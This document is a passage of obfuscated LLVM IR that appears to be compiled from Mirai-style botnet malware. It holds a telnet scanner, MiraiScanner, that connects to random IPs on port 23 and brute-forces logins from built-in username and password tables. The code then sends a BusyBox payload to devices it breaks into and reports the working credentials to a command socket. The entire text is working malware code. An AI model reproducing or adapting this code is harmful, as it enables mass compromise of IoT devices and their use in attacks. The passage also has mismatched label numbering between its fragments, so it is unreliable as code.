  %732 = load i32, i32* %6, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %733
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %734, i32 0, i32 4
  %736 = load i8, i8* %735, align 2
  %737 = zext i8 %736 to i64
  %738 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %737
  %739 = load i8*, i8** %738, align 8
  %740 = load i32, i32* %6, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %741
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %742, i32 0, i32 5
  %744 = load i8, i8* %743, align 1
  %745 = zext i8 %744 to i64
  %746 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %745
  %747 = load i8*, i8** %746, align 8
  %748 = call i32 (i32, i8*, ...) @sockprintf(i32 %727, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.492, i32 0, i32 0), i8* %731, i8* %739, i8* %747)
  %749 = load i32, i32* %6, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %750
  call void @advance_telstate(%struct.telstate_t* %751, i32 8)
  br label %924

; <label>:752:                                    ; preds = %95
  %753 = call i64 @time(i64* null) #5
  %754 = trunc i64 %753 to i32
  %755 = load i32, i32* %6, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %756
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %757, i32 0, i32 7
  store i32 %754, i32* %758, align 16
  %759 = load i32, i32* %6, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 0
  %763 = load i32, i32* %762, align 16
  %764 = call i64 @send(i32 %763, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.493, i32 0, i32 0), i64 4, i32 16384)
  %765 = icmp slt i64 %764, 0
  br i1 %765, label %766, label %767

; <label>:766:                                    ; preds = %752
  br label %767

; <label>:767:                                    ; preds = %766, %752
  %768 = load i32, i32* %6, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 0
  %772 = load i32, i32* %771, align 16
  %773 = call i64 @send(i32 %772, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.494, i32 0, i32 0), i64 7, i32 16384)
  %774 = icmp slt i64 %773, 0
  br i1 %774, label %775, label %776

; <label>:775:                                    ; preds = %767
  br label %776

; <label>:776:                                    ; preds = %775, %767
  %777 = load i32, i32* %6, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 0
  %781 = load i32, i32* %780, align 16
  %782 = load i8*, i8** @Busybox_Payload, align 8
  %783 = load i8*, i8** @Busybox_Payload, align 8
  %784 = call i64 @strlen(i8* %783) #9
  %785 = call i64 @send(i32 %781, i8* %782, i64 %784, i32 16384)
  %786 = icmp slt i64 %785, 0
  br i1 %786, label %787, label %791

; <label>:787:                                    ; preds = %776
  %788 = load i32, i32* %6, align 4
  %789 = sext i32 %788 to i64
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %789
  call void @reset_telstate(%struct.telstate_t* %790)
  br label %925

; <label>:791:                                    ; preds = %776
  %792 = load i32, i32* @mainCommSock, align 4
  %793 = load i32, i32* %6, align 4
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %794
  %796 = call i8* @get_telstate_host(%struct.telstate_t* %795)
  %797 = load i32, i32* %6, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 4
  %801 = load i8, i8* %800, align 2
  %802 = zext i8 %801 to i64
  %803 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %802
  %804 = load i8*, i8** %803, align 8
  %805 = load i32, i32* %6, align 4
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 5
  %809 = load i8, i8* %808, align 1
  %810 = zext i8 %809 to i64
  %811 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %810
  %812 = load i8*, i8** %811, align 8
  %813 = call i32 (i32, i8*, ...) @sockprintf(i32 %792, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.495, i32 0, i32 0), i8* %796, i8* %804, i8* %812)
  %814 = load i32, i32* %6, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 0
  %818 = load i32, i32* %817, align 16
  %819 = load i32, i32* %3, align 4
  %820 = load i32, i32* %6, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 9
  %824 = load i8*, i8** %823, align 8
  %825 = call i32 @read_until_response(i32 %818, i32 %819, i8* %824, i32 1024, i8** bitcast ([7 x i8]* @.str.496 to i8**))
  %826 = icmp ne i32 %825, 0
  br i1 %826, label %827, label %875

; <label>:827:                                    ; preds = %791
  %828 = load i32, i32* %6, align 4
  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %829
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %830, i32 0, i32 9
  %832 = load i8*, i8** %831, align 8
  %833 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %832, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.496, i32 0, i32 0))
  %834 = icmp ne i32 %833, 0
  br i1 %834, label %835, label %874

; <label>:835:                                    ; preds = %827
  %836 = load i32, i32* %6, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %837
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %838, i32 0, i32 3
  %840 = load i8, i8* %839, align 1
  %841 = zext i8 %840 to i32
  %842 = icmp ne i32 %841, 3
  br i1 %842, label %843, label %874

; <label>:843:                                    ; preds = %835
  %844 = load i32, i32* @mainCommSock, align 4
  %845 = load i32, i32* %6, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 1
  %849 = bitcast i32* %848 to %struct.in_addr*
  %850 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %849, i32 0, i32 0
  %851 = load i32, i32* %850, align 4
  %852 = call i8* @inet_ntoa(i32 %851) #5
  %853 = load i32, i32* %6, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 4
  %857 = load i8, i8* %856, align 2
  %858 = zext i8 %857 to i64
  %859 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %858
  %860 = load i8*, i8** %859, align 8
  %861 = load i32, i32* %6, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 5
  %865 = load i8, i8* %864, align 1
  %866 = zext i8 %865 to i64
  %867 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %866
  %868 = load i8*, i8** %867, align 8
  %869 = call i32 (i32, i8*, ...) @sockprintf(i32 %844, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.497, i32 0, i32 0), i8* %852, i8* %860, i8* %868)
  %870 = load i32, i32* %6, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %871
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %872, i32 0, i32 3
  store i8 3, i8* %873, align 1
  br label %874

; <label>:874:                                    ; preds = %843, %835, %827
  br label %875

; <label>:875:                                    ; preds = %874, %791
  %876 = load i32, i32* %6, align 4
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %877
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %878, i32 0, i32 7
  %880 = load i32, i32* %879, align 16
  %881 = sub i32 %880, -1200028749
  %882 = add i32 %881, 10
  %883 = add i32 %882, -1200028749
  %884 = add i32 %880, 10
  %885 = zext i32 %883 to i64
  %886 = call i64 @time(i64* null) #5
  %887 = icmp slt i64 %885, %886
  br i1 %887, label %888, label %923

; <label>:888:                                    ; preds = %875
  %889 = load i32, i32* %6, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 3
  %893 = load i8, i8* %892, align 1
  %894 = zext i8 %893 to i32
  %895 = icmp ne i32 %894, 3
  br i1 %895, label %896, label %919

; <label>:896:                                    ; preds = %888
  %897 = load i32, i32* @mainCommSock, align 4
  %898 = load i32, i32* %6, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %899
  %901 = call i8* @get_telstate_host(%struct.telstate_t* %900)
  %902 = load i32, i32* %6, align 4
  %903 = sext i32 %902 to i64
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %903
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %904, i32 0, i32 4
  %906 = load i8, i8* %905, align 2
  %907 = zext i8 %906 to i64
  %908 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %907
  %909 = load i8*, i8** %908, align 8
  %910 = load i32, i32* %6, align 4
  %911 = sext i32 %910 to i64
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %911
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %912, i32 0, i32 5
  %914 = load i8, i8* %913, align 1
  %915 = zext i8 %914 to i64
  %916 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %915
  %917 = load i8*, i8** %916, align 8
  %918 = call i32 (i32, i8*, ...) @sockprintf(i32 %897, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.498, i32 0, i32 0), i8* %901, i8* %909, i8* %917)
  br label %919

; <label>:919:                                    ; preds = %896, %888
  %920 = load i32, i32* %6, align 4
  %921 = sext i32 %920 to i64
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %921
  call void @reset_telstate(%struct.telstate_t* %922)
  br label %923

; <label>:923:                                    ; preds = %919, %875
  br label %924

; <label>:924:                                    ; preds = %923, %726, %669, %563, %521, %464, %422, %367, %246, %95
  br label %925

; <label>:925:                                    ; preds = %924, %787, %722, %683, %651, %559, %547, %504, %460, %448, %404, %344, %340, %208, %177, %164
  %926 = load i32, i32* %6, align 4
  %927 = sub i32 0, %926
  %928 = sub i32 0, 1
  %929 = add i32 %927, %928
  %930 = sub i32 0, %929
  %931 = add nsw i32 %926, 1
  store i32 %930, i32* %6, align 4
  br label %77

; <label>:932:                                    ; preds = %77
  br label %75
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @MiraiScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub i32 %25, -1604499754
  %27 = sub i32 %26, 100
  %28 = add i32 %27, -1604499754
  %29 = sub nsw i32 %25, 100
  store i32 %28, i32* %5, align 4
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sgt i32 %30, %31
  br i1 %32, label %33, label %35

; <label>:33:                                     ; preds = %2
  %34 = load i32, i32* %4, align 4
  store i32 %34, i32* %5, align 4
  br label %35

; <label>:35:                                     ; preds = %33, %2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = call zeroext i16 @htons(i16 zeroext 23) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = call noalias i8* @malloc(i64 1025) #5
  store i8* %41, i8** %17, align 8
  %42 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 1025, i32 1, i1 false)
  %43 = load i32, i32* %5, align 4
  %44 = zext i32 %43 to i64
  %45 = call i8* @llvm.stacksave()
  store i8* %45, i8** %19, align 8
  %46 = alloca %struct.telstate_t, i64 %44, align 16
  %47 = bitcast %struct.telstate_t* %46 to i8*
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = mul i64 %49, 5
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 %50, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %51

; <label>:51:                                     ; preds = %69, %35
  %52 = load i32, i32* %6, align 4
  %53 = load i32, i32* %5, align 4
  %54 = icmp slt i32 %52, %53
  br i1 %54, label %55, label %74

; <label>:55:                                     ; preds = %51
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %57
  %59 = bitcast %struct.telstate_t* %58 to i8*
  call void @llvm.memset.p0i8.i64(i8* %59, i8 0, i64 32, i32 16, i1 false)
  %60 = load i32, i32* %6, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %61
  %63 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %62, i32 0, i32 3
  store i8 1, i8* %63, align 1
  %64 = load i8*, i8** %17, align 8
  %65 = load i32, i32* %6, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %66
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %67, i32 0, i32 9
  store i8* %64, i8** %68, align 8
  br label %69

; <label>:69:                                     ; preds = %55
  %70 = load i32, i32* %6, align 4
  %71 = sub i32 0, 1
  %72 = sub i32 %70, %71
  %73 = add nsw i32 %70, 1
  store i32 %72, i32* %6, align 4
  br label %51

; <label>:74:                                     ; preds = %51
  br label %75

; <label>:75:                                     ; preds = %936, %74
  br label %76

; <label>:76:                                     ; preds = %75
  store i32 0, i32* %6, align 4
  br label %77

; <label>:77:                                     ; preds = %930, %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %5, align 4
  %80 = icmp slt i32 %78, %79
  br i1 %80, label %81, label %936

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %83
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %84, i32 0, i32 7
  %86 = load i32, i32* %85, align 16
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %95

; <label>:88:                                     ; preds = %81
  %89 = call i64 @time(i64* null) #5
  %90 = trunc i64 %89 to i32
  %91 = load i32, i32* %6, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %92
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %93, i32 0, i32 7
  store i32 %90, i32* %94, align 16
  br label %95

; <label>:95:                                     ; preds = %88, %81
  %96 = load i32, i32* %6, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %97
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %98, i32 0, i32 2
  %100 = load i8, i8* %99, align 8
  %101 = zext i8 %100 to i32
  switch i32 %101, label %929 [
    i32 0, label %102
    i32 1, label %259
    i32 2, label %378
    i32 3, label %434
    i32 4, label %479
    i32 5, label %534
    i32 6, label %579
    i32 7, label %683
    i32 8, label %765
  ]

; <label>:102:                                    ; preds = %95
  %103 = load i32, i32* %6, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %104
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %105, i32 0, i32 3
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 1
  br i1 %109, label %110, label %130

; <label>:110:                                    ; preds = %102
  %111 = load i32, i32* %6, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 9
  %115 = load i8*, i8** %114, align 8
  store i8* %115, i8** %20, align 8
  %116 = load i32, i32* %6, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %117
  %119 = bitcast %struct.telstate_t* %118 to i8*
  call void @llvm.memset.p0i8.i64(i8* %119, i8 0, i64 32, i32 16, i1 false)
  %120 = load i8*, i8** %20, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 9
  store i8* %120, i8** %124, align 8
  %125 = call i32 @MiraiIPRanges()
  %126 = load i32, i32* %6, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 1
  store i32 %125, i32* %129, align 4
  br label %184

; <label>:130:                                    ; preds = %102
  %131 = load i32, i32* %6, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 3
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 0
  br i1 %137, label %138, label %183

; <label>:138:                                    ; preds = %130
  %139 = load i32, i32* %6, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 4
  %143 = load i8, i8* %142, align 2
  %144 = sub i8 %143, 40
  %145 = add i8 %144, 1
  %146 = add i8 %145, 40
  %147 = add i8 %143, 1
  store i8 %146, i8* %142, align 2
  %148 = load i32, i32* %6, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %149
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %150, i32 0, i32 5
  %152 = load i8, i8* %151, align 1
  %153 = sub i8 %152, 23
  %154 = add i8 %153, 1
  %155 = add i8 %154, 23
  %156 = add i8 %152, 1
  store i8 %155, i8* %151, align 1
  %157 = load i32, i32* %6, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %158
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %159, i32 0, i32 5
  %161 = load i8, i8* %160, align 1
  %162 = zext i8 %161 to i64
  %163 = icmp eq i64 %162, 1
  br i1 %163, label %164, label %169

; <label>:164:                                    ; preds = %138
  %165 = load i32, i32* %6, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %166
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %167, i32 0, i32 3
  store i8 1, i8* %168, align 1
  br label %169

; <label>:169:                                    ; preds = %164, %138
  %170 = load i32, i32* %6, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 4
  %174 = load i8, i8* %173, align 2
  %175 = zext i8 %174 to i64
  %176 = icmp eq i64 %175, 1
  br i1 %176, label %177, label %182

; <label>:177:                                    ; preds = %169
  %178 = load i32, i32* %6, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 3
  store i8 1, i8* %181, align 1
  br label %930

; <label>:182:                                    ; preds = %169
  br label %183

; <label>:183:                                    ; preds = %182, %130
  br label %184

; <label>:184:                                    ; preds = %183, %110
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %185, align 4
  %186 = call zeroext i16 @htons(i16 zeroext 23) #10
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %186, i16* %187, align 2
  %188 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %189 = getelementptr inbounds [8 x i8], [8 x i8]* %188, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %189, i8 0, i64 8, i32 4, i1 false)
  %190 = load i32, i32* %6, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 1
  %194 = load i32, i32* %193, align 4
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %196 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %195, i32 0, i32 0
  store i32 %194, i32* %196, align 4
  %197 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %198 = load i32, i32* %6, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 0
  store i32 %197, i32* %201, align 16
  %202 = load i32, i32* %6, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 16
  %207 = icmp eq i32 %206, -1
  br i1 %207, label %208, label %209

; <label>:208:                                    ; preds = %184
  br label %930

; <label>:209:                                    ; preds = %184
  %210 = load i32, i32* %6, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 0
  %214 = load i32, i32* %213, align 16
  %215 = load i32, i32* %6, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %216
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 16
  %220 = call i32 (i32, i32, ...) @fcntl(i32 %219, i32 3, i8* null)
  %221 = xor i32 %220, -1
  %222 = xor i32 2048, -1
  %223 = xor i32 2011519456, -1
  %224 = and i32 %221, 2011519456
  %225 = and i32 %220, %223
  %226 = and i32 %222, 2011519456
  %227 = and i32 2048, %223
  %228 = or i32 %224, %225
  %229 = or i32 %226, %227
  %230 = xor i32 %228, %229
  %231 = or i32 %221, %222
  %232 = xor i32 %231, -1
  %233 = or i32 2011519456, %223
  %234 = and i32 %232, %233
  %235 = or i32 %230, %234
  %236 = or i32 %220, 2048
  %237 = call i32 (i32, i32, ...) @fcntl(i32 %214, i32 4, i32 %235)
  %238 = load i32, i32* %6, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %239
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %240, i32 0, i32 0
  %242 = load i32, i32* %241, align 16
  %243 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %244 = call i32 @connect(i32 %242, %struct.sockaddr* %243, i32 16)
  %245 = icmp eq i32 %244, -1
  br i1 %245, label %246, label %254

; <label>:246:                                    ; preds = %209
  %247 = call i32* @__errno_location() #10
  %248 = load i32, i32* %247, align 4
  %249 = icmp ne i32 %248, 115
  br i1 %249, label %250, label %254

; <label>:250:                                    ; preds = %246
  %251 = load i32, i32* %6, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %252
  call void @reset_telstate(%struct.telstate_t* %253)
  br label %258

; <label>:254:                                    ; preds = %246, %209
  %255 = load i32, i32* %6, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %256
  call void @advance_telstate(%struct.telstate_t* %257, i32 1)
  br label %258

; <label>:258:                                    ; preds = %254, %250
  br label %929

; <label>:259:                                    ; preds = %95
  br label %260

; <label>:260:                                    ; preds = %259
  %261 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %262 = getelementptr inbounds [16 x i64], [16 x i64]* %261, i64 0, i64 0
  %263 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %262) #5, !srcloc !6
  %264 = extractvalue { i64, i64* } %263, 0
  %265 = extractvalue { i64, i64* } %263, 1
  %266 = trunc i64 %264 to i32
  store i32 %266, i32* %21, align 4
  %267 = ptrtoint i64* %265 to i64
  %268 = trunc i64 %267 to i32
  store i32 %268, i32* %22, align 4
  br label %269

; <label>:269:                                    ; preds = %260
  br label %270

; <label>:270:                                    ; preds = %269
  %271 = load i32, i32* %6, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %272
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %273, i32 0, i32 0
  %275 = load i32, i32* %274, align 16
  %276 = srem i32 %275, 64
  %277 = zext i32 %276 to i64
  %278 = shl i64 1, %277
  %279 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %280 = load i32, i32* %6, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %281
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %282, i32 0, i32 0
  %284 = load i32, i32* %283, align 16
  %285 = sdiv i32 %284, 64
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds [16 x i64], [16 x i64]* %279, i64 0, i64 %286
  %288 = load i64, i64* %287, align 8
  %289 = and i64 %288, %278
  %290 = xor i64 %288, %278
  %291 = or i64 %289, %290
  %292 = or i64 %288, %278
  store i64 %291, i64* %287, align 8
